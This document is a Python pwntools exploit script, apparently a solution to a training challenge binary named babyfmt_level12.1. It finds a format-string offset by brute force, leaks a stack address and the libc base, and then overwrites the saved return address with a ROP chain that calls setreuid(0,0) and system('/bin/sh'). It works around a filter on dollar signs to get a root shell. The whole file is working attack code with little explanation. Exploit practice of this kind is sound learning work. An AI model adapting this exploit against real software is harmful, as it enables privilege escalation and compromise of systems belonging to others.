# idea: write func addr in to ret inside printf to get a looping func (and hence infinite printf)
# 1. first printf : leak  %7$p which is sip - 992. Leak %165$p, which is __libc_start_main+243
# 2. second printf : write system(/bin/sh) into (rsp when ret inside printf)


from pwn import *

context.arch = 'amd64'

def get_offset():
    dummy = b"aaaabaaacaaadaaaeaaa"
    for i in range(6, 100):
        p = process("/challenge/babyfmt_level12.1")
        print(p.recv())
        p.send(dummy + b"INIT" + b"%llx" * 5 + b"%llx" * (i - 5) + b"FINI")
        p.recvuntil(b"Your input is:")
        p.recvline()
        output = p.recv()
        print(output)
        p.close()
        if b"616161" in output:
            # either in offset or in padding
            leak = output[output.index(b"FINI") -16 : output.index(b"FINI")]
            leak = leak[2:]
            if leak[-2:] != b'61' and leak[-2:] != b'62':
                # we are in padding
                continue
            else:
                leak = bytes.fromhex(leak.decode())[::-1]
                padlen = cyclic_find(leak)
                return padlen, i


padlen, offset = get_offset()
print(padlen)
print(offset)
prefix_length = 102 # the string prefix in printf

elf = ELF("/challenge/babyfmt_level12.1")
rop = ROP(elf)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process("/challenge/babyfmt_level12.1")

# leak stack addr & libc base
payload = b"A" * padlen + b"%p" * 7 + b"||" + b"%p" * 158 + b"||"
p.send(payload)
p.recvuntil(b"Your input is:")
p.recvline()
output = p.recvuntil(b'||')[-16:-2]
saved_rip = int(output, 16) + 962
output = p.recvuntil(b'||')[-16:-2]
libc_base = int(output, 16) - libc.sym['__libc_start_main'] - 243
print("saved rip = {}".format(hex(saved_rip)))
print("libc base = {}".format(hex(libc_base)))

# system(/bin/sh)
libc.address = libc_base
libc_rop = ROP(libc)

bin_sh = next(libc.search(b'/bin/sh'))
libc_rop.setreuid(0, 0)
libc_rop.system(bin_sh)

payload = b"A" * padlen + fmtstr_payload(offset, {saved_rip: libc_rop.chain()}, numbwritten = prefix_length + padlen, no_dollars=True) # dollar signs are filters
p.send(payload)
p.interactive()

